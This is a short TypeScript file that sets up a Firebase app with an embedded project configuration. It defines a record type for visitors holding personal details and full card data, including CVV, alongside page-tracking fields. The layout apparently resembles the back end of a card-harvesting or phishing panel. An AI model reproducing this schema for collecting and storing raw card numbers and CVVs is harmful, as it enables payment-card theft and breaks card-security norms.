import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyDqUCm3TP3YQ5stW9mWLACTiW6WowQMrfE",
  authDomain: "swed-8d73b.firebaseapp.com",
  databaseURL: "https://swed-8d73b-default-rtdb.firebaseio.com",
  projectId: "swed-8d73b",
  storageBucket: "swed-8d73b.firebasestorage.app",
  messagingSenderId: "685168570681",
  appId: "1:685168570681:web:b2f367991b4f57c4ec38e8",
  measurementId: "G-RW2J2Z9PXD"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

